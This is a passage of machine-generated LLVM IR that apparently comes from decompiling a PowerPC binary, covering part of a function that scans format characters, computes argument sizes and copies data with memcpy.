dec_label_pc_1000dc88:                            ; preds = %dec_label_pc_1000dc7c
  %v1_1000dc88 = add i32 %v0_1000dc7c, 1
  store i32 %v0_1000dc8c, i32* @r31, align 4
  store i32 -1, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_1000daf4

dec_label_pc_1000dc98:                            ; preds = %dec_label_pc_1000dc7c
  store i32 %v0_1000dc8c, i32* @r31, align 4
  br label %dec_label_pc_1000dca0

dec_label_pc_1000dca0:                            ; preds = %dec_label_pc_1000dc74, %dec_label_pc_1000dc98
  %storemerge1 = phi i32 [ -1, %dec_label_pc_1000dc98 ], [ %v0_1000dc8c, %dec_label_pc_1000dc74 ]
  store i32 %storemerge1, i32* %r4.global-to-local, align 4
  store i32 268500992, i32* %r9.global-to-local, align 4
  %v2_1000dca4 = load i8, i8* %v1_1000dc7c, align 1
  %v3_1000dca4 = zext i8 %v2_1000dca4 to i32
  store i32 %v3_1000dca4, i32* %r10.global-to-local, align 4
  store i32 ptrtoint ([9 x i8]* @global_var_10016b84.607 to i32), i32* %r11.global-to-local, align 4
  br label %dec_label_pc_1000dcac

dec_label_pc_1000dcac:                            ; preds = %dec_label_pc_1000dcb8, %dec_label_pc_1000dca0
  %v0_1000dcb8 = phi i32 [ %v1_1000dcb8, %dec_label_pc_1000dcb8 ], [ ptrtoint ([9 x i8]* @global_var_10016b84.607 to i32), %dec_label_pc_1000dca0 ]
  %v1_1000dcac = inttoptr i32 %v0_1000dcb8 to i8*
  %v2_1000dcac = load i8, i8* %v1_1000dcac, align 1
  %v3_1000dcac = zext i8 %v2_1000dcac to i32
  store i32 %v3_1000dcac, i32* %r0.global-to-local, align 4
  %v4_1000dcb0 = icmp eq i8 %v2_1000dca4, %v2_1000dcac
  br i1 %v4_1000dcb0, label %dec_label_pc_1000da7c, label %dec_label_pc_1000dcb8

dec_label_pc_1000dcb8:                            ; preds = %dec_label_pc_1000dcac
  %v1_1000dcb8 = add i32 %v0_1000dcb8, 1
  %v2_1000dcb8 = inttoptr i32 %v1_1000dcb8 to i8*
  %v3_1000dcb8 = load i8, i8* %v2_1000dcb8, align 1
  %v4_1000dcb8 = zext i8 %v3_1000dcb8 to i32
  store i32 %v4_1000dcb8, i32* %r0.global-to-local, align 4
  store i32 %v1_1000dcb8, i32* %r11.global-to-local, align 4
  %v3_1000dcbc = icmp eq i8 %v3_1000dcb8, 0
  br i1 %v3_1000dcbc, label %dec_label_pc_1000dcc4, label %dec_label_pc_1000dcac

dec_label_pc_1000dcc4:                            ; preds = %dec_label_pc_1000dcb8, %dec_label_pc_1000da7c
  %v0_1000dcec = phi i32 [ %v1_1000da7c, %dec_label_pc_1000da7c ], [ %v0_1000dc7c, %dec_label_pc_1000dcb8 ]
  %v0_1000dce8 = phi i32 [ %v0_1000dcb8, %dec_label_pc_1000da7c ], [ %v1_1000dcb8, %dec_label_pc_1000dcb8 ]
  %v2_1000dccc = sub i32 %v0_1000dce8, ptrtoint ([9 x i8]* @global_var_10016b84.607 to i32)
  store i32 %v2_1000dccc, i32* %r9.global-to-local, align 4
  %v2_1000dcd0 = icmp sgt i32 %v2_1000dccc, 1
  br i1 %v2_1000dcd0, label %dec_label_pc_1000dcf0, label %dec_label_pc_1000dcd8

dec_label_pc_1000dcd8:                            ; preds = %dec_label_pc_1000dcc4
  %v1_1000dcd8 = inttoptr i32 %v0_1000dcec to i8*
  %v2_1000dcd8 = load i8, i8* %v1_1000dcd8, align 1
  %v3_1000dcd8 = zext i8 %v2_1000dcd8 to i32
  store i32 %v3_1000dcd8, i32* %r0.global-to-local, align 4
  %v1_1000dcdc = inttoptr i32 %v0_1000dce8 to i8*
  %v2_1000dcdc = load i8, i8* %v1_1000dcdc, align 1
  %v3_1000dcdc = zext i8 %v2_1000dcdc to i32
  store i32 %v3_1000dcdc, i32* %r9.global-to-local, align 4
  %v4_1000dce0 = icmp eq i8 %v2_1000dcd8, %v2_1000dcdc
  br i1 %v4_1000dce0, label %dec_label_pc_1000dce8, label %dec_label_pc_1000dcf0

dec_label_pc_1000dce8:                            ; preds = %dec_label_pc_1000dcd8
  %v1_1000dce8 = add i32 %v0_1000dce8, 9
  store i32 %v1_1000dce8, i32* %r11.global-to-local, align 4
  %v1_1000dcec = add i32 %v0_1000dcec, 1
  store i32 %v1_1000dcec, i32* @r30, align 4
  br label %dec_label_pc_1000dcf0

dec_label_pc_1000dcf0:                            ; preds = %dec_label_pc_1000dcd8, %dec_label_pc_1000dcc4, %dec_label_pc_1000dce8
  %v0_1000dcf4 = phi i32 [ %v0_1000dce8, %dec_label_pc_1000dcd8 ], [ %v0_1000dce8, %dec_label_pc_1000dcc4 ], [ %v1_1000dce8, %dec_label_pc_1000dce8 ]
  %v0_1000dcf0 = phi i32 [ %v0_1000dcec, %dec_label_pc_1000dcd8 ], [ %v0_1000dcec, %dec_label_pc_1000dcc4 ], [ %v1_1000dcec, %dec_label_pc_1000dce8 ]
  %v1_1000dcf0 = inttoptr i32 %v0_1000dcf0 to i8*
  %v2_1000dcf0 = load i8, i8* %v1_1000dcf0, align 1
  %v3_1000dcf0 = zext i8 %v2_1000dcf0 to i32
  store i32 %v3_1000dcf0, i32* @r7, align 4
  %v1_1000dcf4 = add i32 %v0_1000dcf4, 9
  %v2_1000dcf4 = inttoptr i32 %v1_1000dcf4 to i8*
  %v3_1000dcf4 = load i8, i8* %v2_1000dcf4, align 1
  %v4_1000dcf4 = zext i8 %v3_1000dcf4 to i32
  store i32 %v4_1000dcf4, i32* %r0.global-to-local, align 4
  %v3_1000dcf8 = icmp eq i8 %v2_1000dcf0, 0
  %v1_1000dcfc = mul nuw nsw i32 %v4_1000dcf4, 256
  store i32 %v1_1000dcfc, i32* %r10.global-to-local, align 4
  br i1 %v3_1000dcf8, label %dec_label_pc_1000df34, label %dec_label_pc_1000dd04

dec_label_pc_1000dd04:                            ; preds = %dec_label_pc_1000dcf0
  %v1_1000dd08 = and i32 %v1_1000dcfc, 1024
  store i32 %v1_1000dd08, i32* %r0.global-to-local, align 4
  %v3_1000dd08 = icmp eq i32 %v1_1000dd08, 0
  store i32 268500992, i32* %r3.global-to-local, align 4
  %v3_1000dd14 = load i32, i32* %stack_var_-96, align 4
  store i32 %v3_1000dd14, i32* %r11.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_10016bb8.609 to i32), i32* %r5.global-to-local, align 4
  store i32 ptrtoint ([21 x i8]* @global_var_10016bc4.608 to i32), i32* %r9.global-to-local, align 4
  br label %dec_label_pc_1000dd24

dec_label_pc_1000dd24:                            ; preds = %dec_label_pc_1000dd88, %dec_label_pc_1000dd04
  %v1_1000dd30 = phi i32 [ %v1_1000dd88, %dec_label_pc_1000dd88 ], [ ptrtoint ([21 x i8]* @global_var_10016bc4.608 to i32), %dec_label_pc_1000dd04 ]
  %v1_1000dd24 = inttoptr i32 %v1_1000dd30 to i8*
  %v2_1000dd24 = load i8, i8* %v1_1000dd24, align 1
  %v3_1000dd24 = zext i8 %v2_1000dd24 to i32
  store i32 %v3_1000dd24, i32* %r0.global-to-local, align 4
  %v4_1000dd28 = icmp eq i8 %v2_1000dd24, %v2_1000dcf0
  br i1 %v4_1000dd28, label %dec_label_pc_1000dd30, label %dec_label_pc_1000dd88

dec_label_pc_1000dd30:                            ; preds = %dec_label_pc_1000dd24
  %v2_1000dd30 = sub i32 %v1_1000dd30, ptrtoint ([21 x i8]* @global_var_10016bc4.608 to i32)
  %tmp61 = icmp slt i32 %v2_1000dd30, 18
  %brmerge = or i1 %v3_1000dd08, %tmp61
  br i1 %brmerge, label %dec_label_pc_1000dd44, label %dec_label_pc_1000dd40

dec_label_pc_1000dd40:                            ; preds = %dec_label_pc_1000dd30
  %v1_1000dd40 = add i32 %v2_1000dd30, -2
  br label %dec_label_pc_1000dd44

dec_label_pc_1000dd44:                            ; preds = %dec_label_pc_1000dd30, %dec_label_pc_1000dd40
  %storemerge = phi i32 [ %v1_1000dd40, %dec_label_pc_1000dd40 ], [ %v2_1000dd30, %dec_label_pc_1000dd30 ]
  %v0_1000dd44 = phi i32 [ %v1_1000dd40, %dec_label_pc_1000dd40 ], [ %v2_1000dd30, %dec_label_pc_1000dd30 ]
  store i32 %storemerge, i32* %r9.global-to-local, align 4
  %v1_1000dd44 = load i32, i32* @r28, align 4
  %v2_1000dd44 = add i32 %v1_1000dd44, 32
  %v3_1000dd44 = inttoptr i32 %v2_1000dd44 to i32*
  store i32 %v0_1000dd44, i32* %v3_1000dd44, align 4
  store i32 ptrtoint (i32* @global_var_10016bb7.610 to i32), i32* %r11.global-to-local, align 4
  %v0_1000dd50.pre = load i32, i32* %r9.global-to-local, align 4
  br label %dec_label_pc_1000dd4c

dec_label_pc_1000dd4c:                            ; preds = %dec_label_pc_1000dd4c, %dec_label_pc_1000dd44
  %v0_1000dd4c = phi i32 [ %v1_1000dd4c, %dec_label_pc_1000dd4c ], [ ptrtoint (i32* @global_var_10016bb7.610 to i32), %dec_label_pc_1000dd44 ]
  %v1_1000dd4c = add i32 %v0_1000dd4c, 1
  %v2_1000dd4c = inttoptr i32 %v1_1000dd4c to i8*
  %v3_1000dd4c = load i8, i8* %v2_1000dd4c, align 1
  %v4_1000dd4c = zext i8 %v3_1000dd4c to i32
  store i32 %v4_1000dd4c, i32* %r0.global-to-local, align 4
  store i32 %v1_1000dd4c, i32* %r11.global-to-local, align 4
  %v3_1000dd50 = icmp sgt i32 %v0_1000dd50.pre, %v4_1000dd4c
  br i1 %v3_1000dd50, label %dec_label_pc_1000dd4c, label %dec_label_pc_1000dd58

dec_label_pc_1000dd58:                            ; preds = %dec_label_pc_1000dd4c
  %v0_1000dd58 = load i32, i32* %r5.global-to-local, align 4
  %v2_1000dd58 = sub i32 %v1_1000dd4c, %v0_1000dd58
  %v1_1000dd60 = mul i32 %v2_1000dd58, 2
  store i32 %v1_1000dd60, i32* %r11.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_10016ba8.611 to i32), i32* %r9.global-to-local, align 4
  %v2_1000dd68 = add i32 %v1_1000dd60, ptrtoint (i32* @global_var_10016ba8.611 to i32)
  %v3_1000dd68 = inttoptr i32 %v2_1000dd68 to i16*
  %v4_1000dd68 = load i16, i16* %v3_1000dd68, align 2
  %v5_1000dd68 = sext i16 %v4_1000dd68 to i32
  store i32 %v5_1000dd68, i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_10016b98.612 to i32), i32* %r9.global-to-local, align 4
  store i32 ptrtoint ([21 x i8]* @global_var_10016bc4.608 to i32), i32* @r8, align 4
  %v2_1000dd78 = add i32 %v1_1000dd60, ptrtoint (i32* @global_var_10016b98.612 to i32)
  %v3_1000dd78 = inttoptr i32 %v2_1000dd78 to i16*
  %v4_1000dd78 = load i16, i16* %v3_1000dd78, align 2
  %v5_1000dd78 = sext i16 %v4_1000dd78 to i32
  store i32 %v5_1000dd78, i32* %r9.global-to-local, align 4
  %v2_1000dd7c = or i32 %v5_1000dd68, %v1_1000dcfc
  store i32 %v2_1000dd7c, i32* %r0.global-to-local, align 4
  %v2_1000dd80 = and i32 %v5_1000dd78, %v2_1000dd7c
  store i32 %v2_1000dd80, i32* %r11.global-to-local, align 4
  br label %dec_label_pc_1000dd94

dec_label_pc_1000dd88:                            ; preds = %dec_label_pc_1000dd24
  %v1_1000dd88 = add i32 %v1_1000dd30, 1
  %v2_1000dd88 = inttoptr i32 %v1_1000dd88 to i8*
  %v3_1000dd88 = load i8, i8* %v2_1000dd88, align 1
  %v4_1000dd88 = zext i8 %v3_1000dd88 to i32
  store i32 %v4_1000dd88, i32* %r0.global-to-local, align 4
  store i32 %v1_1000dd88, i32* @r8, align 4
  %v3_1000dd8c = icmp eq i8 %v3_1000dd88, 0
  br i1 %v3_1000dd8c, label %dec_label_pc_1000dd94, label %dec_label_pc_1000dd24

dec_label_pc_1000dd94:                            ; preds = %dec_label_pc_1000dd88, %dec_label_pc_1000dd58
  %v0_1000dd94 = phi i32 [ %v2_1000dd80, %dec_label_pc_1000dd58 ], [ %v3_1000dd14, %dec_label_pc_1000dd88 ]
  store i32 %v0_1000dd94, i32* %stack_var_-96, align 4
  %v0_1000dd98 = load i32, i32* %r6.global-to-local, align 4
  %v1_1000dd98 = call i32 @__asm_rlwinm(i32 %v0_1000dd98, i32 30, i32 31, i32 31)
  %not.v2_1000dd9c = icmp eq i32 %v1_1000dd98, 0
  %v6_1000dda0 = sext i1 %not.v2_1000dd9c to i32
  store i32 %v6_1000dda0, i32* %r9.global-to-local, align 4
  %v1_1000dda4 = call i32 @__asm_rlwinm(i32 %v1_1000dcfc, i32 0, i32 20, i32 23)
  store i32 %v1_1000dda4, i32* %r0.global-to-local, align 4
  %v1_1000dda8 = call i32 @__asm_rlwinm(i32 %v6_1000dda0, i32 0, i32 0, i32 27)
  store i32 %v1_1000dda8, i32* %r9.global-to-local, align 4
  %v0_1000ddac = load i32, i32* @r30, align 4
  %v1_1000ddac = inttoptr i32 %v0_1000ddac to i8*
  %v2_1000ddac = load i8, i8* %v1_1000ddac, align 1
  %v3_1000ddac = zext i8 %v2_1000ddac to i32
  store i32 %v3_1000ddac, i32* %r10.global-to-local, align 4
  %v0_1000ddb0 = load i32, i32* %r6.global-to-local, align 4
  %v1_1000ddb0 = call i32 @__asm_rlwinm(i32 %v0_1000ddb0, i32 0, i32 30, i32 28)
  %v1_1000ddb4 = add i32 %v1_1000dda8, 48
  store i32 %v1_1000ddb4, i32* %r9.global-to-local, align 4
  %v2_1000ddb8 = or i32 %v1_1000ddb0, %v1_1000dda4
  store i32 %v2_1000ddb8, i32* %r11.global-to-local, align 4
  store i32 1, i32* @r7, align 4
  %v0_1000ddc0 = load i32, i32* %r10.global-to-local, align 4
  %v1_1000ddc0 = load i32, i32* @r28, align 4
  %v2_1000ddc0 = add i32 %v1_1000ddc0, 12
  %v3_1000ddc0 = inttoptr i32 %v2_1000ddc0 to i32*
  store i32 %v0_1000ddc0, i32* %v3_1000ddc0, align 4
  %v0_1000ddc4 = load i32, i32* %r4.global-to-local, align 4
  %v1_1000ddc4 = load i32, i32* @r28, align 4
  %v2_1000ddc4 = add i32 %v1_1000ddc4, 4
  %v3_1000ddc4 = inttoptr i32 %v2_1000ddc4 to i32*
  store i32 %v0_1000ddc4, i32* %v3_1000ddc4, align 4
  %v0_1000ddc8 = load i32, i32* @r31, align 4
  %v1_1000ddc8 = load i32, i32* @r28, align 4
  %v2_1000ddc8 = add i32 %v1_1000ddc8, 8
  %v3_1000ddc8 = inttoptr i32 %v2_1000ddc8 to i32*
  store i32 %v0_1000ddc8, i32* %v3_1000ddc8, align 4
  %v0_1000ddcc = load i32, i32* %r9.global-to-local, align 4
  %v1_1000ddcc = load i32, i32* @r28, align 4
  %v2_1000ddcc = add i32 %v1_1000ddcc, 20
  %v3_1000ddcc = inttoptr i32 %v2_1000ddcc to i32*
  store i32 %v0_1000ddcc, i32* %v3_1000ddcc, align 4
  %v0_1000ddd0 = load i32, i32* %r11.global-to-local, align 4
  %v1_1000ddd0 = load i32, i32* @r28, align 4
  %v2_1000ddd0 = add i32 %v1_1000ddd0, 16
  %v3_1000ddd0 = inttoptr i32 %v2_1000ddd0 to i32*
  store i32 %v0_1000ddd0, i32* %v3_1000ddd0, align 4
  %v0_1000ddd4 = load i32, i32* @r7, align 4
  %v1_1000ddd4 = load i32, i32* @r28, align 4
  %v2_1000ddd4 = add i32 %v1_1000ddd4, 28
  %v3_1000ddd4 = inttoptr i32 %v2_1000ddd4 to i32*
  store i32 %v0_1000ddd4, i32* %v3_1000ddd4, align 4
  %v0_1000ddd8 = load i32, i32* @r8, align 4
  %v1_1000ddd8 = inttoptr i32 %v0_1000ddd8 to i8*
  %v2_1000ddd8 = load i8, i8* %v1_1000ddd8, align 1
  %v3_1000ddd8 = zext i8 %v2_1000ddd8 to i32
  store i32 %v3_1000ddd8, i32* %r9.global-to-local, align 4
  %v3_1000dddc = icmp eq i8 %v2_1000ddd8, 0
  br i1 %v3_1000dddc, label %dec_label_pc_1000dde4, label %dec_label_pc_1000ddfc

dec_label_pc_1000dde4:                            ; preds = %dec_label_pc_1000dd94
  %v0_1000dde4 = load i32, i32* @r30, align 4
  %v1_1000dde4 = inttoptr i32 %v0_1000dde4 to i8*
  %v2_1000dde4 = load i8, i8* %v1_1000dde4, align 1
  %v3_1000dde4 = zext i8 %v2_1000dde4 to i32
  store i32 %v3_1000dde4, i32* %r0.global-to-local, align 4
  %v3_1000dde8 = icmp eq i8 %v2_1000dde4, 109
  br i1 %v3_1000dde8, label %dec_label_pc_1000ddf0, label %dec_label_pc_1000df34

dec_label_pc_1000ddf0:                            ; preds = %dec_label_pc_1000dde4
  store i32 20, i32* %r0.global-to-local, align 4
  %v1_1000ddf4 = load i32, i32* @r28, align 4
  %v2_1000ddf4 = add i32 %v1_1000ddf4, 28
  %v3_1000ddf4 = inttoptr i32 %v2_1000ddf4 to i32*
  store i32 %v3_1000ddd8, i32* %v3_1000ddf4, align 4
  %v0_1000ddf8 = load i32, i32* %r0.global-to-local, align 4
  %v1_1000ddf8 = load i32, i32* @r28, align 4
  %v2_1000ddf8 = add i32 %v1_1000ddf8, 32
  %v3_1000ddf8 = inttoptr i32 %v2_1000ddf8 to i32*
  store i32 %v0_1000ddf8, i32* %v3_1000ddf8, align 4
  br label %dec_label_pc_1000ddfc

dec_label_pc_1000ddfc:                            ; preds = %dec_label_pc_1000dd94, %dec_label_pc_1000ddf0
  %v0_1000ddfc = load i32, i32* @r26, align 4
  %tmp62 = icmp slt i32 %v0_1000ddfc, 1
  br i1 %tmp62, label %dec_label_pc_1000ded8, label %dec_label_pc_1000de04

dec_label_pc_1000de04:                            ; preds = %dec_label_pc_1000ddfc
  store i32 0, i32* @r27, align 4
  br label %dec_label_pc_1000de08

dec_label_pc_1000de08:                            ; preds = %dec_label_pc_1000dec0, %dec_label_pc_1000de04
  %v0_1000de30 = phi i32 [ 0, %dec_label_pc_1000de04 ], [ %v1_1000dec4, %dec_label_pc_1000dec0 ]
  %v2_1000de08 = icmp sgt i32 %v0_1000de30, 2
  br i1 %v2_1000de08, label %dec_label_pc_1000de2c, label %dec_label_pc_1000de10

dec_label_pc_1000de10:                            ; preds = %dec_label_pc_1000de08
  %v1_1000de10 = mul i32 %v0_1000de30, 4
  store i32 %v1_1000de10, i32* %r0.global-to-local, align 4
  %v0_1000de14 = load i32, i32* @r1, align 4
  %v2_1000de14 = add i32 %v0_1000de14, %v1_1000de10
  store i32 %v2_1000de14, i32* %r9.global-to-local, align 4
  %v1_1000de18 = add i32 %v2_1000de14, 20
  %v2_1000de18 = inttoptr i32 %v1_1000de18 to i32*
  %v3_1000de18 = load i32, i32* %v2_1000de18, align 4
  store i32 %v3_1000de18, i32* %r0.global-to-local, align 4
  %v1_1000de1c = load i32, i32* @r28, align 4
  %v2_1000de1c = add i32 %v1_1000de1c, %v0_1000de30
  store i32 %v2_1000de1c, i32* %r9.global-to-local, align 4
  %v1_1000de20 = urem i32 %v3_1000de18, 256
  store i32 %v1_1000de20, i32* %r11.global-to-local, align 4
  %v1_1000de24 = trunc i32 %v3_1000de18 to i8
  %v3_1000de24 = add i32 %v2_1000de1c, 36
  %v4_1000de24 = inttoptr i32 %v3_1000de24 to i8*
  store i8 %v1_1000de24, i8* %v4_1000de24, align 1
  %v0_1000de38.pre = load i32, i32* %r11.global-to-local, align 4
  br label %dec_label_pc_1000de38

dec_label_pc_1000de2c:                            ; preds = %dec_label_pc_1000de08
  %v2_1000de30 = add i32 %v0_1000de30, %stack_var_-84.3
  store i32 %v2_1000de30, i32* %r9.global-to-local, align 4
  %v1_1000de34 = add i32 %v2_1000de30, -2
  store i32 %v1_1000de34, i32* %r11.global-to-local, align 4
  br label %dec_label_pc_1000de38

dec_label_pc_1000de38:                            ; preds = %dec_label_pc_1000de10, %dec_label_pc_1000de2c
  %v0_1000de58 = phi i32 [ %v0_1000de38.pre, %dec_label_pc_1000de10 ], [ %v1_1000de34, %dec_label_pc_1000de2c ]
  %v1_1000de38 = load i32, i32* @r26, align 4
  %v3_1000de38 = icmp sgt i32 %v0_1000de58, %v1_1000de38
  br i1 %v3_1000de38, label %dec_label_pc_1000de40, label %dec_label_pc_1000de4c

dec_label_pc_1000de40:                            ; preds = %dec_label_pc_1000de38
  %v2_1000de40 = icmp sgt i32 %v0_1000de58, 9
  br i1 %v2_1000de40, label %dec_label_pc_1000df34, label %dec_label_pc_1000de48

dec_label_pc_1000de48:                            ; preds = %dec_label_pc_1000de40
  store i32 %v0_1000de58, i32* @r26, align 4
  br label %dec_label_pc_1000de4c

dec_label_pc_1000de4c:                            ; preds = %dec_label_pc_1000de38, %dec_label_pc_1000de48
  store i32 %v2_1000dae8.pre-phi, i32* %r9.global-to-local, align 4
  %v0_1000de50 = load i32, i32* @r27, align 4
  %v1_1000de50 = mul i32 %v0_1000de50, 4
  store i32 %v1_1000de50, i32* %r0.global-to-local, align 4
  %v2_1000de54 = add i32 %v1_1000de50, %v2_1000dae8.pre-phi
  %v3_1000de54 = inttoptr i32 %v2_1000de54 to i32*
  %v4_1000de54 = load i32, i32* %v3_1000de54, align 4
  store i32 %v4_1000de54, i32* @r31, align 4
  %v1_1000de58 = add i32 %v0_1000de58, -1
  store i32 %v1_1000de58, i32* @r25, align 4
  %v1_1000de5c = mul i32 %v1_1000de58, 4
  %v3_1000de60 = icmp eq i32 %v4_1000de54, 8
  %v1_1000de64 = load i32, i32* @r28, align 4
  %v2_1000de64 = add i32 %v1_1000de64, %v1_1000de5c
  store i32 %v2_1000de64, i32* %r9.global-to-local, align 4
  %v1_1000de68 = add i32 %v2_1000de64, 40
  %v2_1000de68 = inttoptr i32 %v1_1000de68 to i32*
  %v3_1000de68 = load i32, i32* %v2_1000de68, align 4
  store i32 %v3_1000de68, i32* %r3.global-to-local, align 4
  br i1 %v3_1000de60, label %dec_label_pc_1000dec0, label %dec_label_pc_1000de70

dec_label_pc_1000de70:                            ; preds = %dec_label_pc_1000de4c
  %v3_1000de70 = icmp eq i32 %v3_1000de68, 8
  br i1 %v3_1000de70, label %dec_label_pc_1000dea8, label %dec_label_pc_1000de78

dec_label_pc_1000de78:                            ; preds = %dec_label_pc_1000de70
  %v4_1000de78 = icmp eq i32 %v3_1000de68, %v4_1000de54
  br i1 %v4_1000de78, label %dec_label_pc_1000dea8, label %dec_label_pc_1000de80

dec_label_pc_1000de80:                            ; preds = %dec_label_pc_1000de78
  %v1_1000de80 = call i32 @_promoted_size(i32 %v3_1000de68)
  store i32 %v1_1000de80, i32* @r29, align 4
  %v0_1000de88 = load i32, i32* @r31, align 4
  store i32 %v0_1000de88, i32* %r3.global-to-local, align 4
  %v1_1000de8c = call i32 @_promoted_size(i32 %v0_1000de88)
  store i32 %v1_1000de8c, i32* %r3.global-to-local, align 4
  %v0_1000de98 = call i32 @__asm_mfcr()
  store i32 %v0_1000de98, i32* %r3.global-to-local, align 4
  store i32 %v0_1000de98, i32* %r0.global-to-local, align 4
  %v1_1000de9c = call i32 @__asm_rlwinm(i32 %v0_1000de98, i32 31, i32 31, i32 31)
  store i32 %v1_1000de9c, i32* %r0.global-to-local, align 4
  %v3_1000dea0 = icmp eq i32 %v1_1000de9c, 0
  br i1 %v3_1000dea0, label %dec_label_pc_1000dec0, label %dec_label_pc_1000de80.dec_label_pc_1000dea8_crit_edge

dec_label_pc_1000de80.dec_label_pc_1000dea8_crit_edge: ; preds = %dec_label_pc_1000de80
  %v0_1000deac.pre = load i32, i32* @r27, align 4
  %v0_1000deb4.pre = load i32, i32* @r25, align 4
  %v1_1000deb8.pre = load i32, i32* @r28, align 4
  br label %dec_label_pc_1000dea8

dec_label_pc_1000dea8:                            ; preds = %dec_label_pc_1000de80.dec_label_pc_1000dea8_crit_edge, %dec_label_pc_1000de78, %dec_label_pc_1000de70
  %v1_1000deb8 = phi i32 [ %v1_1000deb8.pre, %dec_label_pc_1000de80.dec_label_pc_1000dea8_crit_edge ], [ %v1_1000de64, %dec_label_pc_1000de78 ], [ %v1_1000de64, %dec_label_pc_1000de70 ]
  %v0_1000deb4 = phi i32 [ %v0_1000deb4.pre, %dec_label_pc_1000de80.dec_label_pc_1000dea8_crit_edge ], [ %v1_1000de58, %dec_label_pc_1000de78 ], [ %v1_1000de58, %dec_label_pc_1000de70 ]
  %v0_1000deac = phi i32 [ %v0_1000deac.pre, %dec_label_pc_1000de80.dec_label_pc_1000dea8_crit_edge ], [ %v0_1000de50, %dec_label_pc_1000de78 ], [ %v0_1000de50, %dec_label_pc_1000de70 ]
  store i32 %v2_1000dae8.pre-phi, i32* %r9.global-to-local, align 4
  %v1_1000deac = mul i32 %v0_1000deac, 4
  store i32 %v1_1000deac, i32* %r0.global-to-local, align 4
  %v2_1000deb0 = add i32 %v1_1000deac, %v2_1000dae8.pre-phi
  %v3_1000deb0 = inttoptr i32 %v2_1000deb0 to i32*
  %v4_1000deb0 = load i32, i32* %v3_1000deb0, align 4
  store i32 %v4_1000deb0, i32* %r0.global-to-local, align 4
  %v1_1000deb4 = mul i32 %v0_1000deb4, 4
  %v2_1000deb8 = add i32 %v1_1000deb4, %v1_1000deb8
  store i32 %v2_1000deb8, i32* %r9.global-to-local, align 4
  %v2_1000debc = add i32 %v2_1000deb8, 40
  %v3_1000debc = inttoptr i32 %v2_1000debc to i32*
  store i32 %v4_1000deb0, i32* %v3_1000debc, align 4
  br label %dec_label_pc_1000dec0

dec_label_pc_1000dec0:                            ; preds = %dec_label_pc_1000de80, %dec_label_pc_1000de4c, %dec_label_pc_1000dea8
  %v0_1000dec0 = load i32, i32* @r28, align 4
  %v1_1000dec0 = add i32 %v0_1000dec0, 28
  %v2_1000dec0 = inttoptr i32 %v1_1000dec0 to i32*
  %v3_1000dec0 = load i32, i32* %v2_1000dec0, align 4
  %v0_1000dec4 = load i32, i32* @r27, align 4
  %v1_1000dec4 = add i32 %v0_1000dec4, 1
  store i32 %v1_1000dec4, i32* @r27, align 4
  %v1_1000dec8 = add i32 %v3_1000dec0, 2
  store i32 %v1_1000dec8, i32* %r9.global-to-local, align 4
  %v2_1000decc = icmp slt i32 %v1_1000dec4, %v1_1000dec8
  br i1 %v2_1000decc, label %dec_label_pc_1000de08, label %dec_label_pc_1000def0

dec_label_pc_1000ded8:                            ; preds = %dec_label_pc_1000ddfc
  %v0_1000ded8 = load i32, i32* @r28, align 4
  %v1_1000ded8 = add i32 %v0_1000ded8, 28
  %v2_1000ded8 = inttoptr i32 %v1_1000ded8 to i32*
  %v3_1000ded8 = load i32, i32* %v2_1000ded8, align 4
  store i32 %v3_1000ded8, i32* %r5.global-to-local, align 4
  %v1_1000dedc = add i32 %v0_1000ded8, 40
  store i32 %v1_1000dedc, i32* @r3, align 4
  %v0_1000dee0 = load i32, i32* @r7, align 4
  %v1_1000dee0 = trunc i32 %v0_1000dee0 to i8
  %v3_1000dee0 = add i32 %v0_1000ded8, 38
  %v4_1000dee0 = inttoptr i32 %v3_1000dee0 to i8*
  store i8 %v1_1000dee0, i8* %v4_1000dee0, align 1
  %v2_1000dee4 = ptrtoint i32* %stack_var_-96 to i32
  store i32 %v2_1000dee4, i32* @r4, align 4
  %v0_1000dee8 = load i32, i32* %r5.global-to-local, align 4
  %v1_1000dee8 = mul i32 %v0_1000dee8, 4
  store i32 %v1_1000dee8, i32* @r5, align 4
  store i32 268492528, i32* @lr, align 4
  %v0_1000deec = call i32 @memcpy()
  store i32 %v0_1000deec, i32* %r3.global-to-local, align 4
  %v0_1000def0.pre = load i32, i32* @r28, align 4
  br label %dec_label_pc_1000def0

dec_label_pc_1000def0:                            ; preds = %dec_label_pc_1000dec0, %dec_label_pc_1000ded8
  %v0_1000def0 = phi i32 [ %v0_1000def0.pre, %dec_label_pc_1000ded8 ], [ %v0_1000dec0, %dec_label_pc_1000dec0 ]
  %v1_1000def0 = add i32 %v0_1000def0, 16
  %v2_1000def0 = inttoptr i32 %v1_1000def0 to i32*
  %v3_1000def0 = load i32, i32* %v2_1000def0, align 4
  store i32 %v3_1000def0, i32* %r0.global-to-local, align 4
  %v0_1000def4 = load i32, i32* @r26, align 4
  %v2_1000def4 = add i32 %v0_1000def0, 24
  %v3_1000def4 = inttoptr i32 %v2_1000def4 to i32*
  store i32 %v0_1000def4, i32* %v3_1000def4, align 4
  %v0_1000def8 = load i32, i32* %r0.global-to-local, align 4
  %v1_1000def8 = and i32 %v0_1000def8, 128
  store i32 %v1_1000def8, i32* %r9.global-to-local, align 4
  %v3_1000def8 = icmp eq i32 %v1_1000def8, 0
  br i1 %v3_1000def8, label %dec_label_pc_1000df00, label %dec_label_pc_1000df0c

dec_label_pc_1000df00:                            ; preds = %dec_label_pc_1000def0
  %v0_1000df00 = load i32, i32* @r30, align 4
  %v1_1000df00 = add i32 %v0_1000df00, 1
  store i32 %v1_1000df00, i32* %r0.global-to-local, align 4
  %v1_1000df04 = load i32, i32* @r28, align 4
  %v2_1000df04 = inttoptr i32 %v1_1000df04 to i32*
  store i32 %v1_1000df00, i32* %v2_1000df04, align 4
  br label %dec_label_pc_1000df24

dec_label_pc_1000df0c:                            ; preds = %dec_label_pc_1000def0
  %v2_1000df0c = ptrtoint i32* %stack_var_-80 to i32
  store i32 %v2_1000df0c, i32* %r0.global-to-local, align 4
  %v0_1000df10 = load i32, i32* @r28, align 4
  %v1_1000df10 = inttoptr i32 %v0_1000df10 to i32*
  %v2_1000df10 = load i32, i32* %v1_1000df10, align 4
  %v1_1000df14 = load i32, i32* @r30, align 4
  %v2_1000df14 = sub i32 %v1_1000df14, %v2_1000df0c
  %v1_1000df18 = mul i32 %v2_1000df14, 4
  store i32 %v1_1000df18, i32* %r0.global-to-local, align 4
  %v2_1000df1c = add i32 %v1_1000df18, %v2_1000df10
